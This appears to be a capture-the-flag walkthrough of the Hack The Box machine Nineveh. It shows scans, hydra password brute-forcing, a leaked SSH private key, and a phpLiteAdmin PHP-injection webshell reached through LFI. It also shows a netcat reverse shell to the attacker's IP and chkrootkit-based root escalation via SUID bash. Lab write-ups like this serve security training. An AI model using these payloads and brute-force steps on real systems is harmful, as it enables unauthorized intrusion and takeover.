
### Initial access
Nmap
```
PORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/localityName=Athens/emailAddress=admin@nineveh.htb/organizationalUnitName=Support
| Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/localityName=Athens/emailAddress=admin@nineveh.htb/organizationalUnitName=Support
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-07-01T15:03:30
| Not valid after:  2018-07-01T15:03:30
| MD5:     d182 94b8 0210 7992 bf01 e802 b26f 8639
| SHA-1:   2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0
| SHA-256: 69f4 3953 c229 b1d7 e136 d4c5 46f9 500d 8400 bb86 49a6 2a33 69f3 db25 8b96 3fe5
| -----BEGIN CERTIFICATE-----
| MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD
| VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV
| BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu
| aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN
| MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN
| BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl
| Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx
| IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2
| WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp
| eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO
| GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C
| U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi
| AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV
| HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy
| OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma
| AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U
| qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4
| Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d
| 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1
| CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb
| KrYQgX28Ulf8OSGJuA==
|_-----END CERTIFICATE-----
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time


```


Dir scan
HTTP
```
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ ffuf -u http://$target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.39.160/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Output file      : dirs
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 94ms]
department              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 131ms]
[INFO] Adding a new job to the queue: http://10.129.39.160/department/FUZZ

[INFO] Starting queued job on target: http://10.129.39.160/department/FUZZ

css                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 77ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.39.160/department/css/
files                   [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 78ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.39.160/department/files/
:: Progress: [62282/62282] :: Job [2/2] :: 507 req/sec :: Duration: [0:02:16] :: Errors: 0 ::

```
HTTPS
```
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ ffuf -u https://$target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs_https

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.39.160/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Output file      : dirs_https
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

db                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 78ms]
[INFO] Adding a new job to the queue: https://10.129.39.160/db/FUZZ

server-status           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 77ms]
[INFO] Starting queued job on target: https://10.129.39.160/db/FUZZ

:: Progress: [62282/62282] :: Job [2/2] :: 396 req/sec :: Duration: [0:02:16] :: Errors: 0 ::
                                                                                                      
```

Brute force user in http page
```bash {11}
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt  10.129.39.160 http-post-form '/department/login.php:username=^USER^&password=^PASS^:F=Invalid Password!'

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-14 22:04:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
[DATA] attacking http-post-form://10.129.39.160:80/department/login.php:username=^USER^&password=^PASS^:F=Invalid Password!
[STATUS] 1410.00 tries/min, 1410 tries in 00:01h, 14342992 to do in 169:33h, 16 active
[STATUS] 1415.33 tries/min, 4246 tries in 00:03h, 14340156 to do in 168:52h, 16 active
[80][http-post-form] host: 10.129.39.160   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-14 22:07:42

```
In note page we have
```
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois



```
Testting LFI we see include function with is vunerable to mutiple attack.
```

Warning:  include(../../.../files/ninevehNotes.txt): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31



Warning:  include(): Failed opening '../../.../files/ninevehNotes.txt' for inclusion (include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31
```


New user `amrois`
Error on page https

```
Warning: rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114
```
Use  ferox buster for better dir scan
```
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ feroxbuster -u https://$target \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,js,txt \
  --insecure

Scans:
  0: running      https://10.129.39.160/
  2: running      https://10.129.39.160/db/
  3: running      https://10.129.39.160/secure_notes/

```
We see folder secure_notes
Install image and explore it
```bash
strings niveh.png 


secret/
0000755
0000041
0000041
00000000000
13126060277
012377
ustar  
www-data
www-data
secret/nineveh.priv
0000600
0000041
0000041
00000003213
13126045656
014730
ustar  
www-data
www-data
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
0000644
0000041
0000041
00000000620
13126060277
014541
ustar  
www-data
www-data
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
                                                                                                                                                                        
```

After a while we bruteforce the page phpadminlite
```bash {12}
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ hydra -l "" -P /usr/share/wordlists/rockyou.txt -s 443 -S 10.129.39.160 http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect password." -t 4    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-14 22:34:32
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344402 login tries (l:1/p:14344402), ~3586101 tries per task
[DATA] attacking http-post-forms://10.129.39.160:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect password.
[STATUS] 137.00 tries/min, 137 tries in 00:01h, 14344265 to do in 1745:03h, 4 active
[STATUS] 129.33 tries/min, 388 tries in 00:03h, 14344014 to do in 1848:28h, 4 active
[STATUS] 134.71 tries/min, 943 tries in 00:07h, 14343459 to do in 1774:34h, 4 active
[443][http-post-form] host: 10.129.39.160   password: password123

```

We using this  to chain sqli and lfi to a webshell let do this.
```
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ cat 24044.txt 
# Exploit Title: phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
# Google Dork: inurl:phpliteadmin.php (Default PW: admin)
# Date: 01/10/2013
# Exploit Author: L@usch - http://la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt
# Vendor Homepage: http://code.google.com/p/phpliteadmin/
# Vendor Status: Informed
# Software Link: http://phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip
# Version: 1.9.3
# Tested on: Windows and Linux

Description:

phpliteadmin.php#1784: 'Creating a New Database' =>
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php

Done!

Proof: http://goo.gl/ZqPVL                                                                                                                                                                                                                                            

```

Cuz after testing we coulde see that the lfi check if we have string `ninevehNotes` or not so we  do  as those step below
```
create db name ninevehNotes.php -> make table -> add "<?php system($_REQUEST["cmd"]) ?>" to the field and default value  
```

![[Assets/Screenshot from 2026-09-15 11-04-01.png]]
Let revshell
```
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ curl -s -b 'PHPSESSID=6git1ls8bvbkrstfqv9udulul5' \
'http://10.129.39.160/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.17.47%204444%20%3E%2Ftmp%2Ff'
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ penelope --oscp-safe --no-log -p 4444                                                      
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => nineveh 10.129.39.160 Linux-x86_64 👤 www-data(33) 😍 Session ID <1>



id
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@nineveh:/var/www/html/department$ 


```

### Lateral Movement

Run linpeas
```
root      1333  0.4  0.2   8756  2228 ?        Ss   20:24   0:44 /usr/sbin/knockd -d -i ens160

```
Read file config
```
www-data@nineveh:/tmp$ cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

```
We use knock to open port 22
```bash
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ knock 10.129.39.160 571 290 911
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ nano id_rsa                                           
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB/Nineveh]
└─$ ssh -i id_rsa amrois@10.129.39.160
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ 


```
### Priv escalation

Run pspy64
```
2026/09/14 23:26:01 CMD: UID=0    PID=28191  | /bin/ps ax 
2026/09/14 23:26:01 CMD: UID=0    PID=28195  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28194  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28193  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28192  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28197  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28196  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28200  | /bin/sh /bin/egrep c 
2026/09/14 23:26:01 CMD: UID=0    PID=28199  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28198  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28204  | grep -E (^|[^A-Za-z0-9_])basename([^A-Za-z0-9_]|$) 
2026/09/14 23:26:01 CMD: UID=0    PID=28203  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28207  | grep -E c 
2026/09/14 23:26:01 CMD: UID=0    PID=28206  | /bin/echo a\c 
2026/09/14 23:26:01 CMD: UID=0    PID=28205  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28209  | 
2026/09/14 23:26:01 CMD: UID=0    PID=28211  | grep -E ^/bin/.*sh$|bash|elite$|vejeta|\.ark|iroffer 
2026/09/14 23:26:01 CMD: UID=0    PID=28210  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28213  | grep -E ^...s 
2026/09/14 23:26:01 CMD: UID=0    PID=28212  | /bin/ls -l /usr/bin/basename 
2026/09/14 23:26:01 CMD: UID=0    PID=28215  | grep -E (^|[^A-Za-z0-9_])biff([^A-Za-z0-9_]|$) 
2026/09/14 23:26:01 CMD: UID=0    PID=28214  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28218  | grep -E c 
2026/09/14 23:26:01 CMD: UID=0    PID=28217  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28216  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28219  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28222  | /bin/sh /bin/egrep (^|[^A-Za-z0-9_])chfn([^A-Za-z0-9_]|$) 
2026/09/14 23:26:01 CMD: UID=0    PID=28221  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28225  | grep -E c 
2026/09/14 23:26:01 CMD: UID=0    PID=28224  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:26:01 CMD: UID=0    PID=28223  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:29:03 CMD: UID=0    PID=32014  | /bin/sh /usr/bin/chkrootkit 
2026/09/14 23:29:03 CMD: UID=0    PID=32018  | date +%y-%m-%d:%H:%M 
2026/09/14 23:29:03 CMD: UID=0    PID=32019  | chown amrois:amrois /report/report-26-09-14:23:29.txt 

```
We found the exploit https://www.exploit-db.com/exploits/33899
Let get root flag
```bash
amrois@nineveh:/tmp$ echo 'chmod u+s /bin/bash' > update
amrois@nineveh:/tmp$ chmod +x  update
amrois@nineveh:/tmp$ /bin/bash -p
bash-4.3# id
uid=1000(amrois) gid=1000(amrois) euid=0(root) groups=1000(amrois)
bash-4.3# 


```